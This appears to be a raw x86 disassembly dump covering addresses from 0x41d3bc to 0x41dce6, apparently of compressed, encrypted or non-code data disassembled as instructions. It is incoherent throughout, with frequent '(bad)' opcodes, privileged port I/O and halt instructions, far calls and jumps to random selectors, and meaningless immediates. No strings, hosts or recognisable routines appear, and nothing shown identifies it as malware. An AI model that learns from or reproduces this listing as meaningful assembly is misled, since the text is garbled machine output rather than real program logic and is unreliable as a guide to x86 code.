  41d3bc:	xor    eax,0x2461ff62
  41d3c1:	xor    BYTE PTR [edx],0x77
  41d3c4:	pop    ds
  41d3c5:	push   edx
  41d3c6:	sbb    dl,0x91
  41d3c9:	pop    ss
  41d3ca:	(bad)  
  41d3cb:	js     0x41d3aa
  41d3cd:	fsubp  st(5),st
  41d3cf:	fisttp WORD PTR [ebp+0x5e9f4c3]
  41d3d5:	cdq    
  41d3d6:	aas    
  41d3d7:	dec    ebp
  41d3d8:	js     0x41d42a
  41d3da:	inc    ebx
  41d3db:	dec    edx
  41d3dc:	outs   dx,DWORD PTR ds:[esi]
  41d3dd:	jb     0x41d3ff
  41d3df:	fistp  DWORD PTR [edi-0x72b5e75f]
  41d3e5:	jg     0x41d36c
  41d3e7:	jb     0x41d458
  41d3e9:	pop    edi
  41d3ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3eb:	leave  
  41d3ec:	mov    ebp,0x97a15d54
  41d3f1:	in     al,0xba
  41d3f3:	mov    edi,es
  41d3f5:	jge    0x41d42a
  41d3f7:	dec    eax
  41d3f8:	sahf   
  41d3f9:	adc    ah,0xd9
  41d3fc:	das    
  41d3fd:	push   edi
  41d3fe:	fstp   TBYTE PTR [esi+0x3f]
  41d401:	mov    ah,0x13
  41d403:	cmp    BYTE PTR [edx-0x399caa46],dl
  41d409:	mov    edx,0x33269a45
  41d40e:	shl    BYTE PTR [ecx],cl
  41d410:	or     al,bl
  41d412:	rol    al,1
  41d414:	xchg   bh,bh
  41d416:	call   0xa13b:0xe2fe114e
  41d41d:	(bad)  
  41d41e:	sub    bl,BYTE PTR [eax+edx*8]
  41d421:	enter  0x9f67,0x19
  41d425:	retf   
  41d426:	in     al,dx
  41d427:	mov    eax,ds:0x4c666a5b
  41d42c:	xor    DWORD PTR [ebx-0x1],0x27
  41d430:	jp     0x41d3bd
  41d432:	loopne 0x41d48d
  41d434:	ret    
  41d435:	mov    edx,0x2962ea4a
  41d43a:	xor    al,0x60
  41d43c:	neg    BYTE PTR [ecx+0x57]
  41d43f:	mov    dx,0xe37f
  41d443:	hlt    
  41d444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d445:	or     eax,0xe990cceb
  41d44a:	and    eax,0x5955de23
  41d44f:	inc    ebp
  41d450:	icebp  
  41d451:	imul   bh
  41d453:	add    ch,dl
  41d455:	push   ecx
  41d456:	fsubp  st(5),st
  41d458:	jns    0x41d3fb
  41d45a:	lock scas al,BYTE PTR es:[edi]
  41d45c:	mov    ch,0x15
  41d45e:	lods   eax,DWORD PTR ds:[esi]
  41d45f:	in     al,0xa4
  41d461:	in     al,dx
  41d462:	inc    ebp
  41d463:	fsub   QWORD PTR [ebp-0x4c]
  41d466:	push   edi
  41d467:	xor    esp,DWORD PTR [edx*2+0x79bfe4bc]
  41d46e:	in     eax,0x1c
  41d470:	add    eax,0x5e1049dd
  41d475:	mov    ss,edi
  41d477:	jp     0x41d4c5
  41d479:	push   0x10d7d31d
  41d47e:	(bad)  
  41d480:	aam    0x8a
  41d482:	shl    BYTE PTR [edx-0x7c],1
  41d485:	mov    ebx,0x4c8637da
  41d48a:	push   ds
  41d48b:	in     al,0xa1
  41d48d:	pop    ecx
  41d48e:	pop    esp
  41d48f:	out    dx,eax
  41d490:	ret    0xffbd
  41d493:	pop    ebp
  41d494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d495:	cld    
  41d496:	or     BYTE PTR cs:[ebp+0x607c1a08],ah
  41d49d:	mov    ch,0x9a
  41d49f:	out    0xf8,eax
  41d4a1:	iret   
  41d4a2:	xchg   ebp,eax
  41d4a3:	and    esi,ebp
  41d4a5:	fs adc al,0xbc
  41d4a8:	dec    edx
  41d4a9:	adc    ebx,eax
  41d4ab:	and    eax,esp
  41d4ad:	push   edx
  41d4ae:	inc    eax
  41d4af:	and    cl,BYTE PTR [edx+0x21]
  41d4b2:	mov    edi,DWORD PTR [ecx+eax*4+0x67977a5a]
  41d4b9:	and    al,BYTE PTR [ebp-0x79]
  41d4bc:	sub    ecx,DWORD PTR [esi+0x345ca1f0]
  41d4c2:	add    al,0x2
  41d4c4:	cmp    bl,BYTE PTR [ebx-0x9]
  41d4c7:	jae    0x41d496
  41d4c9:	cs mov cl,0xf5
  41d4cc:	clc    
  41d4cd:	sub    al,0xd7
  41d4cf:	adc    DWORD PTR [edx-0x46d77d6c],ebx
  41d4d5:	call   0xd9aa:0x628bdb23
  41d4dc:	push   edi
  41d4dd:	jge    0x41d519
  41d4df:	fst    QWORD PTR [ecx]
  41d4e1:	aaa    
  41d4e2:	cs loope 0x41d511
  41d4e5:	fs jo  0x41d483
  41d4e8:	test   BYTE PTR [eax+edx*1+0x1109d442],dh
  41d4ef:	repnz retf 
  41d4f1:	nop
  41d4f2:	xchg   DWORD PTR [ecx-0x66],eax
  41d4f5:	or     DWORD PTR [edi],ebx
  41d4f7:	ret    0xd1d0
  41d4fa:	push   ebx
  41d4fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4fc:	mov    ah,0x2d
  41d4fe:	mov    ds:0xb6303e7,al
  41d503:	lds    esp,FWORD PTR [esi+0x7ab1547c]
  41d509:	add    bh,BYTE PTR [edi-0x23]
  41d50c:	ins    BYTE PTR es:[edi],dx
  41d50d:	dec    ecx
  41d50e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d50f:	xchg   edx,eax
  41d510:	fstp   QWORD PTR [esi]
  41d512:	in     eax,0xb
  41d514:	int3   
  41d515:	or     dh,BYTE PTR [eax+0x44d448ba]
  41d51b:	push   es
  41d51c:	aad    0x52
  41d51e:	mov    eax,ds:0x83f58be0
  41d523:	mov    ebx,0xfd54b18d
  41d528:	mov    bl,0x52
  41d52a:	lock jmp 0x324d5473
  41d530:	lea    ebp,[ecx+edx*8+0x7119cffa]
  41d537:	lock and DWORD PTR [esi],ebp
  41d53a:	dec    edi
  41d53b:	repnz es out 0x32,eax
  41d53f:	add    eax,0xe469ecce
  41d544:	push   0xcfd6cefa
  41d549:	cs stc 
  41d54b:	fs jbe 0x41d52f
  41d54e:	icebp  
  41d54f:	xchg   edx,eax
  41d550:	adc    eax,0x8ec0bbe2
  41d555:	or     eax,0x224d5a05
  41d55a:	leave  
  41d55b:	xchg   esp,eax
  41d55c:	pusha  
  41d55d:	imul   esp,ebx,0xbcb00c0e
  41d563:	jmp    0xc0a9:0x37ad5d6
  41d56a:	pop    ss
  41d56b:	mov    ds:0x85266012,al
  41d570:	push   esi
  41d571:	and    eax,0xebc6a2ae
  41d576:	fnstsw WORD PTR [edi*8-0x54b178a9]
  41d57d:	repnz scas eax,DWORD PTR es:[edi]
  41d57f:	frstor [eax+0x2d127c19]
  41d585:	test   al,0x7f
  41d587:	or     edi,esp
  41d589:	sbb    bh,BYTE PTR [ebx+ecx*4]
  41d58c:	repnz hlt 
  41d58e:	loop   0x41d5b8
  41d590:	cwde   
  41d591:	fcmove st,st(1)
  41d593:	out    dx,al
  41d594:	xor    dl,cl
  41d596:	sub    ebx,ecx
  41d598:	jne    0x41d5dc
  41d59a:	inc    ebp
  41d59b:	inc    ecx
  41d59c:	xchg   ebx,eax
  41d59d:	cmp    al,0x5d
  41d59f:	xor    eax,0x94c6dd5b
  41d5a4:	out    0xdc,eax
  41d5a6:	jmp    0x3d56aa0b
  41d5ab:	(bad)  
  41d5ac:	xor    ah,ah
  41d5ae:	xchg   DWORD PTR [edx+ecx*1+0x59e5244],ebp
  41d5b5:	ficom  DWORD PTR [edx]
  41d5b7:	sbb    BYTE PTR [edx],ah
  41d5b9:	mov    ah,0x3b
  41d5bb:	and    ebx,esp
  41d5bd:	scas   al,BYTE PTR es:[edi]
  41d5be:	and    esi,0xffffffe6
  41d5c1:	clc    
  41d5c2:	sub    ecx,edi
  41d5c4:	sub    bl,BYTE PTR [edi-0xa]
  41d5c7:	or     BYTE PTR [ecx],bh
  41d5c9:	sahf   
  41d5ca:	dec    ecx
  41d5cb:	dec    edx
  41d5cc:	add    al,BYTE PTR [edi-0x40]
  41d5cf:	mov    ch,0xeb
  41d5d1:	jp     0x41d5b8
  41d5d3:	ret    
  41d5d4:	pop    esi
  41d5d5:	ja     0x41d606
  41d5d7:	dec    edi
  41d5d8:	in     al,dx
  41d5d9:	and    cl,bl
  41d5db:	and    ecx,DWORD PTR [edi-0x1e]
  41d5de:	(bad)  
  41d5df:	mov    eax,ds:0x5a20604f
  41d5e4:	outs   dx,BYTE PTR ds:[esi]
  41d5e5:	mov    cl,ah
  41d5e7:	cs popa 
  41d5e9:	retf   0x6769
  41d5ec:	push   ds
  41d5ed:	stos   DWORD PTR es:[edi],eax
  41d5ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5ef:	fisub  DWORD PTR gs:[esi-0x7c3da03f]
  41d5f6:	je     0x41d5bd
  41d5f8:	out    dx,al
  41d5f9:	rol    BYTE PTR ds:0xcd14f1a5,1
  41d5ff:	fadd   QWORD PTR [edx]
  41d601:	mov    ds:0xd977b373,al
  41d606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d607:	aaa    
  41d608:	dec    edi
  41d609:	or     edx,eax
  41d60b:	loope  0x41d5a4
  41d60d:	and    eax,DWORD PTR [ecx]
  41d60f:	and    dl,BYTE PTR [edi-0x52cbddc2]
  41d615:	mov    ebp,DWORD PTR [edi-0x19aa7a95]
  41d61b:	xchg   BYTE PTR [ebp-0x68f90d69],bl
  41d621:	and    DWORD PTR [eax],esp
  41d623:	xchg   BYTE PTR [eax],dh
  41d625:	in     eax,0xc4
  41d627:	loop   0x41d617
  41d629:	jbe    0x41d5e7
  41d62b:	loop   0x41d5cb
  41d62d:	ins    DWORD PTR es:[edi],dx
  41d62e:	cmc    
  41d62f:	out    0x28,al
  41d631:	adc    DWORD PTR [esi+0x46],esp
  41d634:	mov    eax,0x441dc966
  41d639:	cmc    
  41d63a:	stc    
  41d63b:	xchg   edi,eax
  41d63c:	fisub  WORD PTR ds:[ebx]
  41d63f:	repz (bad) 
  41d641:	ins    DWORD PTR es:[edi],dx
  41d642:	loope  0x41d697
  41d644:	fsubr  st,st(5)
  41d646:	cli    
  41d647:	shl    DWORD PTR [ecx*2+0x2605b7e4],0xfd
  41d64f:	sbb    ch,ch
  41d651:	popf   
  41d652:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d653:	cmp    al,0x42
  41d655:	cmp    ebp,ecx
  41d657:	shr    al,cl
  41d659:	das    
  41d65a:	inc    eax
  41d65b:	cmp    ebx,DWORD PTR [edx]
  41d65d:	push   ebp
  41d65e:	sbb    DWORD PTR [ebp-0x2c],0x64
  41d662:	xchg   ebx,eax
  41d663:	push   ss
  41d664:	pop    ss
  41d665:	in     eax,dx
  41d666:	popf   
  41d667:	les    edi,FWORD PTR [edx+0x53]
  41d66a:	popa   
  41d66b:	pusha  
  41d66c:	adc    eax,0xc939593c
  41d671:	sub    ah,dl
  41d673:	mov    al,ds:0x5faf11b1
  41d678:	fdivr  st,st(4)
  41d67a:	jge    0x41d61f
  41d67c:	data16 jmp 0x41d62a
  41d67f:	jb     0x41d62a
  41d681:	adc    ch,dh
  41d683:	fnstsw WORD PTR [ebx-0x652e8a9f]
  41d689:	sub    DWORD PTR [ebx-0x6088b36d],0x14ab3f77
  41d693:	stos   DWORD PTR es:[edi],eax
  41d694:	pushf  
  41d695:	lock cmp edx,eax
  41d698:	dec    eax
  41d699:	jae    0x41d644
  41d69b:	dec    ebp
  41d69c:	jge    0x41d6ad
  41d69e:	adc    bh,al
  41d6a0:	mov    esp,0x2fe28173
  41d6a5:	in     al,dx
  41d6a6:	pop    ebx
  41d6a7:	stos   DWORD PTR es:[edi],eax
  41d6a8:	sbb    BYTE PTR [ebx+0x6ab7375d],0x83
  41d6af:	adc    BYTE PTR [edx],ah
  41d6b1:	adc    al,BYTE PTR [ebp+ebx*4+0x42]
  41d6b5:	enter  0x7a92,0x3d
  41d6b9:	dec    ebp
  41d6ba:	mov    dh,BYTE PTR [edx]
  41d6bc:	jmp    0xd56:0xf0b29b20
  41d6c3:	cdq    
  41d6c4:	and    eax,0xa9ab7cc6
  41d6c9:	gs inc edi
  41d6cb:	mov    esp,0x6c4ce730
  41d6d0:	adc    DWORD PTR [ecx-0x14],esp
  41d6d3:	test   al,0x63
  41d6d5:	aaa    
  41d6d6:	int    0xa2
  41d6d8:	or     eax,0xa4d28f3e
  41d6dd:	adc    BYTE PTR [ecx+0x566b0998],dh
  41d6e3:	(bad)  
  41d6e4:	outs   dx,BYTE PTR ds:[esi]
  41d6e5:	dec    ecx
  41d6e6:	push   ecx
  41d6e7:	(bad)  
  41d6e8:	stc    
  41d6e9:	push   0xffffffb5
  41d6eb:	jge    0x41d744
  41d6ed:	mov    ebx,0xcae9cd0e
  41d6f2:	jno    0x41d756
  41d6f4:	stos   DWORD PTR es:[edi],eax
  41d6f5:	rcl    DWORD PTR [edx+0x1c153c7a],1
  41d6fb:	fstp   st(1)
  41d6fd:	mov    esi,DWORD PTR ds:0xbf9d28e6
  41d703:	pop    ss
  41d704:	dec    ebx
  41d705:	mov    eax,0x9b2270c5
  41d70a:	fucomi st,st(0)
  41d70c:	and    ah,BYTE PTR [ebx]
  41d70e:	shl    BYTE PTR [ecx+eax*4],1
  41d711:	cld    
  41d712:	dec    eax
  41d713:	imul   esi,DWORD PTR [ecx-0x7f65d352],0xffffff95
  41d71a:	xchg   ecx,eax
  41d71b:	test   BYTE PTR [ebp-0xf575be],bl
  41d721:	es dec edx
  41d723:	enter  0xe324,0x84
  41d727:	mov    esi,0x9feb3bcb
  41d72c:	leave  
  41d72d:	xor    dh,BYTE PTR [edi+esi*1+0x3d]
  41d731:	sub    DWORD PTR [eax+ecx*1+0x26],0x4d
  41d736:	or     BYTE PTR [ecx+ebp*4-0x4fa05d29],ch
  41d73d:	sbb    eax,0xb23c2afd
  41d742:	fmulp  st(1),st
  41d744:	clc    
  41d745:	imul   DWORD PTR [eax+0x7d946ffe]
  41d74b:	(bad)  
  41d74c:	cs cli 
  41d74e:	jl     0x41d796
  41d750:	mov    ah,0x19
  41d752:	sbb    al,0xdd
  41d754:	push   ebp
  41d755:	cmp    edi,DWORD PTR [ebx+0x7c485e82]
  41d75b:	pop    esp
  41d75c:	jbe    0x41d707
  41d75e:	lahf   
  41d75f:	push   esp
  41d760:	dec    edx
  41d761:	inc    BYTE PTR [ebp-0x6cceb6e0]
  41d767:	out    0x86,al
  41d769:	inc    edx
  41d76a:	in     eax,0x70
  41d76c:	add    dl,al
  41d76e:	int    0x60
  41d770:	or     BYTE PTR [esi],ch
  41d772:	je     0x41d794
  41d774:	(bad)  
  41d775:	add    al,0x24
  41d777:	mov    esi,0x5bb1363e
  41d77c:	sbb    bl,dl
  41d77e:	out    dx,al
  41d77f:	pusha  
  41d780:	mov    ebp,0xd24e33c5
  41d785:	sub    dl,BYTE PTR [ebx-0x19458055]
  41d78b:	add    esi,DWORD PTR [ebx-0x48]
  41d78e:	sbb    al,0x80
  41d790:	xor    esp,ebp
  41d792:	pop    ebp
  41d793:	in     eax,dx
  41d794:	in     al,dx
  41d795:	aam    0x78
  41d797:	out    0x2f,eax
  41d799:	push   es
  41d79a:	xor    al,0x25
  41d79c:	pop    esi
  41d79d:	push   edx
  41d79e:	sbb    BYTE PTR [eax],al
  41d7a0:	dec    esi
  41d7a1:	lea    edx,[ebp-0x69]
  41d7a4:	not    BYTE PTR [edx-0x53921259]
  41d7aa:	pushf  
  41d7ab:	push   cs
  41d7ac:	in     al,dx
  41d7ad:	sar    BYTE PTR [edx-0x42],0x23
  41d7b1:	jae    0x41d777
  41d7b3:	je     0x41d7e6
  41d7b5:	cmp    BYTE PTR [edx+0x338e25ce],ah
  41d7bb:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7bd:	add    BYTE PTR [edx+0x5b],dl
  41d7c0:	fst    st(6)
  41d7c2:	xchg   dl,cl
  41d7c4:	cmp    dh,BYTE PTR [edx]
  41d7c6:	pop    esp
  41d7c7:	cmp    esp,DWORD PTR gs:[edx+0x35]
  41d7cb:	enter  0x139,0x37
  41d7cf:	adc    dl,BYTE PTR [eax]
  41d7d1:	xlat   BYTE PTR ds:[ebx]
  41d7d2:	loopne 0x41d84f
  41d7d4:	jmp    0x41d806
  41d7d6:	ss sbb al,0x19
  41d7d9:	xchg   edx,eax
  41d7da:	jle    0x41d78e
  41d7dc:	cmp    edx,0x32cb7362
  41d7e2:	js     0x41d83e
  41d7e4:	or     eax,0x85464eb6
  41d7e9:	outs   dx,DWORD PTR ds:[esi]
  41d7ea:	test   eax,0xc374ac23
  41d7ef:	cmp    eax,DWORD PTR [eax]
  41d7f1:	inc    ecx
  41d7f2:	cli    
  41d7f3:	aad    0x3d
  41d7f5:	into   
  41d7f6:	mov    ebx,0x61be6a5d
  41d7fb:	lods   eax,DWORD PTR ds:[esi]
  41d7fc:	stos   BYTE PTR es:[edi],al
  41d7fd:	shufps xmm5,xmm4,0x44
  41d801:	test   eax,0xf241d226
  41d806:	dec    edx
  41d807:	daa    
  41d808:	lea    eax,[edi+0x32]
  41d80b:	xor    eax,0xc883e686
  41d810:	xlat   BYTE PTR ds:[ebx]
  41d811:	lds    edi,FWORD PTR [edx]
  41d813:	adc    eax,0xada5d526
  41d818:	push   eax
  41d819:	or     DWORD PTR [ebp-0x7f],ecx
  41d81c:	stos   DWORD PTR es:[edi],eax
  41d81d:	aam    0x62
  41d81f:	mov    ecx,0x3d1c1a18
  41d824:	imul   edx,DWORD PTR [ebp-0x2b10193a],0xdb91330b
  41d82e:	mov    eax,ds:0x83e97530
  41d833:	lods   eax,DWORD PTR ds:[esi]
  41d834:	out    dx,eax
  41d835:	hlt    
  41d836:	loopne 0x41d85b
  41d838:	(bad)  
  41d839:	enter  0x8b5e,0x49
  41d83d:	adc    DWORD PTR [edi+eiz*8+0x3e],eax
  41d841:	dec    ecx
  41d842:	xchg   esi,eax
  41d843:	pop    ds
  41d844:	mov    dh,0x4a
  41d846:	push   0x7c
  41d848:	push   ecx
  41d849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d84a:	(bad)  
  41d84b:	ja     0x41d8a1
  41d84d:	mov    ecx,0xbf6f3440
  41d852:	mov    esi,0xf4545bf9
  41d857:	int    0x46
  41d859:	push   ecx
  41d85a:	xor    edx,DWORD PTR [ebp+0x2f]
  41d85d:	pop    ebp
  41d85e:	in     al,dx
  41d85f:	(bad)  
  41d861:	icebp  
  41d862:	shl    ebp,1
  41d864:	cs push ss
  41d866:	pop    ecx
  41d867:	sbb    edx,DWORD PTR ds:0xdb3c1d67
  41d86d:	pop    edx
  41d86e:	jp     0x41d80a
  41d870:	ret    0x1f5e
  41d873:	inc    esi
  41d874:	clc    
  41d875:	add    eax,0x270c
	...
  41da4a:	add    BYTE PTR [eax],al
  41da4c:	arpl   WORD PTR [esi+0x63ff63be],bx
  41da52:	call   FWORD PTR [esi-0x676d79db]
  41da58:	retf   
  41da59:	lock pop esi
  41da5b:	or     DWORD PTR [ebp-0x49],edi
  41da5e:	add    DWORD PTR [eax],eax
  41da60:	and    al,BYTE PTR [edi]
  41da62:	add    BYTE PTR [eax],al
  41da64:	xor    BYTE PTR gs:[esp+edx*4],dh
  41da68:	cmp    eax,0x26e7337a
  41da6d:	inc    esp
  41da6e:	loop   0x41daca
  41da70:	adc    BYTE PTR [ebx-0x54426f7e],0x12
  41da77:	and    eax,0xf4f1fddf
  41da7c:	mov    edx,DWORD PTR [eax-0x6047abd0]
  41da82:	fild   QWORD PTR [ecx+0x44]
  41da85:	fcmovu st,st(7)
  41da87:	in     al,dx
  41da88:	cmp    DWORD PTR [ecx],esi
  41da8a:	in     al,0xf1
  41da8c:	and    BYTE PTR ds:0x1988a185,ch
  41da92:	mov    BYTE PTR [ebp-0x3235c0b0],dh
  41da98:	mov    edx,0xdea88a9e
  41da9d:	mov    ch,0xb9
  41da9f:	mov    eax,ds:0x2d6ac042
  41daa4:	(bad)  
  41daa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daa6:	sub    eax,0x71c622a
  41daab:	(bad)  [ebp-0x69]
  41daae:	aas    
  41daaf:	nop
  41dab0:	dec    eax
  41dab1:	pop    esi
  41dab2:	out    dx,al
  41dab3:	xor    edx,DWORD PTR [edi+0x45]
  41dab6:	inc    esp
  41dab7:	jl     0x41db0d
  41dab9:	psadbw mm2,QWORD PTR [esi-0x1a]
  41dabd:	(bad)  
  41dabe:	outs   dx,BYTE PTR ds:[esi]
  41dabf:	xchg   DWORD PTR [ebx+eiz*1],eax
  41dac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dac3:	aam    0x59
  41dac5:	or     bh,0xd3
  41dac8:	ret    0xa01b
  41dacb:	les    eax,FWORD PTR [ecx]
  41dacd:	in     eax,0xdb
  41dacf:	retf   0xcf60
  41dad2:	imul   ecx,DWORD PTR [edi],0xffffffa7
  41dad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dad6:	xchg   ebp,eax
  41dad7:	pop    edi
  41dad8:	call   0x84b0:0x9a4c2983
  41dadf:	dec    ebp
  41dae0:	pop    ecx
  41dae1:	mov    dh,0x61
  41dae3:	ins    DWORD PTR es:[edi],dx
  41dae4:	fdiv   QWORD PTR [esi+ebp*4]
  41dae7:	adc    esi,DWORD PTR [eax]
  41dae9:	and    eax,0x76cc20fc
  41daee:	lock sbb DWORD PTR [esi-0x2fcf5fe4],esi
  41daf5:	jnp    0x41dafa
  41daf7:	into   
  41daf8:	loop   0x41db20
  41dafa:	pop    esp
  41dafb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dafc:	in     al,dx
  41dafd:	add    BYTE PTR [ebx+0x11],ch
  41db00:	bnd ret 
  41db02:	popf   
  41db03:	pop    edx
  41db04:	aas    
  41db05:	out    dx,eax
  41db06:	lea    ecx,[eax-0x57]
  41db09:	ret    
  41db0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db0b:	fst    DWORD PTR [edi-0x27]
  41db0e:	out    dx,eax
  41db0f:	repnz pop edi
  41db11:	mov    ebp,0x8e84f4ed
  41db16:	imul   edx,DWORD PTR [edi-0x3b7617e2],0xffffff81
  41db1d:	sbb    al,0x99
  41db1f:	das    
  41db20:	std    
  41db21:	inc    ebp
  41db22:	adc    al,0xa9
  41db24:	(bad)  
  41db25:	push   0xce94897f
  41db2a:	push   esi
  41db2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db2c:	into   
  41db2d:	push   0xa26735a4
  41db32:	popa   
  41db33:	lods   al,BYTE PTR ds:[esi]
  41db34:	(bad)  
  41db35:	lock sbb eax,0x8dfab840
  41db3b:	push   edx
  41db3c:	pop    edx
  41db3d:	icebp  
  41db3e:	and    cl,al
  41db40:	adc    DWORD PTR [edi],esp
  41db42:	pop    ds
  41db43:	cmp    al,0x49
  41db45:	push   ebx
  41db46:	and    eax,DWORD PTR [ecx+0x390afa40]
  41db4c:	add    dl,0x34
  41db4f:	add    al,0x69
  41db51:	shl    DWORD PTR [ebx+edi*8],1
  41db54:	ins    DWORD PTR es:[edi],dx
  41db55:	(bad)  
  41db56:	jecxz  0x41dba3
  41db58:	icebp  
  41db59:	fisub  DWORD PTR [edi+0x5ecef148]
  41db5f:	hlt    
  41db60:	(bad)  
  41db61:	jg     0x41daf0
  41db63:	push   edi
  41db64:	ds add eax,0x4f5fc4ce
  41db6a:	push   eax
  41db6b:	out    0x58,al
  41db6d:	jmp    0x41db0c
  41db6f:	ret    0x7cea
  41db72:	aas    
  41db73:	adc    eax,0x37bd1929
  41db78:	add    BYTE PTR [esp+ebx*1-0x1d],dl
  41db7c:	push   cs
  41db7d:	(bad)  [esi-0x11c4b350]
  41db83:	aad    0xee
  41db85:	int    0xf0
  41db87:	call   0x7ef6e22f
  41db8c:	xor    BYTE PTR ds:0xc7d7bc53,bh
  41db92:	mov    WORD PTR [eax-0xadfc8d5],fs
  41db98:	hlt    
  41db99:	daa    
  41db9a:	sbb    DWORD PTR [esp+edx*2+0x42],ecx
  41db9e:	add    al,0x5a
  41dba0:	aas    
  41dba1:	stc    
  41dba2:	ret    
  41dba3:	cwde   
  41dba4:	xchg   DWORD PTR [edx-0x57],edi
  41dba7:	je     0x41dbca
  41dba9:	mov    ecx,0xa75338e1
  41dbae:	jb     0x41db9b
  41dbb0:	je     0x41dc2b
  41dbb2:	jae    0x41dbe4
  41dbb4:	push   eax
  41dbb5:	outs   dx,BYTE PTR ds:[esi]
  41dbb6:	mov    eax,ds:0xa0562d9c
  41dbbb:	dec    esi
  41dbbc:	cmp    DWORD PTR [ecx],ebx
  41dbbe:	sub    eax,eax
  41dbc0:	imul   esi,DWORD PTR [eax],0x522b72d0
  41dbc6:	pop    ebx
  41dbc7:	(bad)  
  41dbc8:	lods   al,BYTE PTR ds:[esi]
  41dbc9:	retf   0xcbfe
  41dbcc:	jns    0x41dc29
  41dbce:	out    0x13,eax
  41dbd0:	add    DWORD PTR [eax],esp
  41dbd2:	in     eax,dx
  41dbd3:	out    dx,al
  41dbd4:	xchg   BYTE PTR [edi-0x67],bl
  41dbd7:	rcl    BYTE PTR [edx-0x74],1
  41dbda:	pusha  
  41dbdb:	xor    BYTE PTR ds:0xa94f10db,0xad
  41dbe2:	push   cs
  41dbe3:	sbb    BYTE PTR [esi+0x26],0x8c
  41dbe7:	test   eax,0xb75fd524
  41dbec:	jmp    0x41dc28
  41dbee:	sti    
  41dbef:	or     edi,eax
  41dbf1:	(bad)  
  41dbf2:	jmp    0xca0e45d0
  41dbf7:	add    BYTE PTR [esi-0x79b2841c],0x9a
  41dbfe:	rol    BYTE PTR [ebx+eax*1],1
  41dc01:	dec    edx
  41dc02:	pop    ecx
  41dc03:	popf   
  41dc04:	repz sub ch,BYTE PTR [edx+eiz*1]
  41dc08:	out    dx,eax
  41dc09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc0a:	loope  0x41dbdf
  41dc0c:	cmp    cl,dh
  41dc0e:	leave  
  41dc0f:	sbb    al,0x6a
  41dc11:	mov    ds:0xa469a847,al
  41dc16:	sbb    DWORD PTR [ebp+0x2f9774a2],ebx
  41dc1c:	jg     0x41dc38
  41dc1e:	cmp    ch,bh
  41dc20:	or     BYTE PTR [edx-0x3a],0xda
  41dc24:	fmul   DWORD PTR [ebx]
  41dc26:	repz in al,0xb7
  41dc29:	and    al,0x49
  41dc2b:	lahf   
  41dc2c:	shl    DWORD PTR [edx],0xa0
  41dc2f:	retf   
  41dc30:	cli    
  41dc31:	out    dx,eax
  41dc32:	ja     0x41dbeb
  41dc34:	das    
  41dc35:	jmp    0x6773c33e
  41dc3a:	lock scas al,BYTE PTR es:[edi]
  41dc3c:	out    0xd3,al
  41dc3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc3f:	out    0x64,eax
  41dc41:	loope  0x41dc1a
  41dc43:	sbb    bl,BYTE PTR [esi-0x2a87c84]
  41dc49:	inc    edx
  41dc4a:	imul   ebp,DWORD PTR [ecx+0x1f7318b0],0x70
  41dc51:	jnp    0x41dcba
  41dc53:	push   cs
  41dc54:	daa    
  41dc55:	pop    ebx
  41dc56:	pop    ebx
  41dc57:	xchg   edi,eax
  41dc58:	scas   al,BYTE PTR es:[edi]
  41dc59:	stos   DWORD PTR es:[edi],eax
  41dc5a:	sub    DWORD PTR [ebx],ebx
  41dc5c:	inc    edi
  41dc5d:	repz fmul DWORD PTR ds:0x4c0ec31
  41dc64:	xchg   DWORD PTR [edi-0x4a129841],eax
  41dc6a:	ja     0x41dbf8
  41dc6c:	xchg   DWORD PTR [esi+0x19919ad4],ecx
  41dc72:	dec    ecx
  41dc73:	retf   
  41dc74:	mov    DWORD PTR [eax],0x986a2412
  41dc7a:	and    eax,0x33cfe98e
  41dc7f:	cmc    
  41dc80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc81:	pop    edi
  41dc82:	adc    DWORD PTR [eax],edi
  41dc84:	sub    esp,DWORD PTR [edx-0x3d]
  41dc87:	or     BYTE PTR [edx-0x30],cl
  41dc8a:	sar    DWORD PTR [ecx-0x6d615fe],1
  41dc90:	sbb    eax,DWORD PTR [eax-0xf225990]
  41dc96:	fisubr DWORD PTR [ecx+0x4ea4c3b1]
  41dc9c:	out    0x5e,eax
  41dc9e:	inc    esi
  41dc9f:	jge    0x41dd0f
  41dca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dca2:	jge    0x41dcd6
  41dca4:	stos   DWORD PTR es:[edi],eax
  41dca5:	idiv   DWORD PTR [edx+0x60]
  41dca8:	repnz (bad) 
  41dcaa:	ficomp DWORD PTR [esi-0x580dbaaf]
  41dcb0:	cdq    
  41dcb1:	or     al,0xcf
  41dcb3:	add    DWORD PTR [ebx-0x1ff79777],ecx
  41dcb9:	and    BYTE PTR [edi-0x5e79e109],dl
  41dcbf:	pop    esp
  41dcc0:	jnp    0x41dd16
  41dcc2:	sar    bl,0x7
  41dcc5:	ds daa 
  41dcc7:	jne    0x41dc61
  41dcc9:	mov    ah,ah
  41dccb:	and    edi,DWORD PTR [ebx-0xef5adce]
  41dcd1:	sbb    al,BYTE PTR [eax]
  41dcd3:	outs   dx,DWORD PTR ds:[esi]
  41dcd4:	sahf   
  41dcd5:	sar    bh,0x23
  41dcd8:	fstp   QWORD PTR [esi+ecx*8]
  41dcdb:	sbb    bh,BYTE PTR [ebx+0x1d]
  41dcde:	iret   
  41dcdf:	inc    ebx
  41dce0:	rcr    BYTE PTR [ebx-0x6c102a3],cl
  41dce6:	push   edi
